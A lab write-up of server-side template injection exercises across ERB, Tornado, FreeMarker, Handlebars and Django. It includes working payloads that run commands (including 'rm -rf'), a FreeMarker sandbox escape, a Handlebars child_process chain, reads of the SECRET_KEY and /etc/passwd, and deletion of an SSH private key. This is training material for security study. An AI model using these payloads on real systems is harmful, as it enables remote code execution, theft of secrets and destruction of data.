# Server-Side Template Injection (SSTI) Labs

## Lab: Basic server-side template injection

Reference: [PayloadsAllTheThings - SSTI Ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md)

### Exploitation

```erb
<%= 7 * 7 %>
<%= system('rm -rf morale.txt') %>
```

---

## Lab: Basic server-side template injection (code context)

### Exploitation

Break out of existing template code context and execute command:

```text
blog-post-author-display=7*7}}{%import os%}{{os.system('rm -rf morale.txt')}}{{7*7
```

---

## Lab: Server-side template injection using documentation

### Analysis

When trying Mako syntax:

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

It responds with an error indicating the template engine is FreeMarker.

### Exploitation

FreeMarker documentation payload to execute commands:

```text
${"freemarker.template.utility.Execute"?new()("rm -rf morale.txt")}
```

---

## Lab: Server-side template injection in an unknown language with a documented exploit

### Analysis

Error message identifies template engine as HandlebarsJS:

![HandlebarsJS error stack](Attachments/Pasted%20image%2020260819175622.png)

### Exploitation

Documented Handlebars template injection payload:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Execution result:

![HandlebarsJS command output](Attachments/Pasted%20image%2020260819180745.png)

---

## Lab: Server-side template injection with information disclosure via user-supplied objects

![Django template error](Attachments/Pasted%20image%2020260819182414.png)

### Django - Debug Information Leak

Trigger debug output:

```django
{% debug %}
```

Extract secret key object:

```django
{{ settings.SECRET_KEY }}
```

---

## Lab: Server-side template injection in a sandboxed environment

### Analysis

Given: FreeMarker template engine inside a sandbox environment.

### Exploitation

Login with the given credentials and edit the templates:

![Template edit menu](Attachments/Pasted%20image%2020260819223205.png)

![Editing template code](Attachments/Pasted%20image%2020260819223452.png)

![Rendered template](Attachments/Pasted%20image%2020260819223554.png)

Sandbox escape payload:

```text
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat my_password.txt")}
```

---

## Lab: Server-side template injection with a custom exploit

### Step 1 — Triggering Error via Avatar Upload

When uploading wrong avatar:

![Wrong avatar error](Attachments/Pasted%20image%2020260820103601.png)

### Step 2 — Arbitrary File Read

Set the avatar to local file path:

```text
blog-post-author-display=user.setAvatar('/etc/passwd', 'image/png')
```

Set a valid image and open the image in a new tab, then set `/etc/passwd` and open in a new tab:

```http
GET /avatar?avatar=wiener
```

![Avatar containing /etc/passwd contents](Attachments/Pasted%20image%2020260820104534.png)

### Step 3 — Reading Application Source Code

With this, we can only read local files directly. Read the source code of the website to find any delete function:

```text
blog-post-author-display=user.setAvatar('/home/carlos/User.php', 'image/png')
```

Reload the website and retrieve the avatar content:

![User.php source in avatar](Attachments/Pasted%20image%2020260820104854.png)

Relevant source code identified:

```php
public function delete() {
    $file = $this->user_dir . "/disabled";
    if (file_put_contents($file, "") === false) {
        throw new Exception("Could not write to " . $file);
    }
}

public function gdprDelete() {
    $this->rm(readlink($this->avatarLink));
    $this->rm($this->avatarLink);
    $this->delete();
}
```

### Step 4 — Deleting Target File

Set the avatar link symlink target to Carlos's private key:

```text
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')&
```

Invoke `gdprDelete` function and reload the post page.
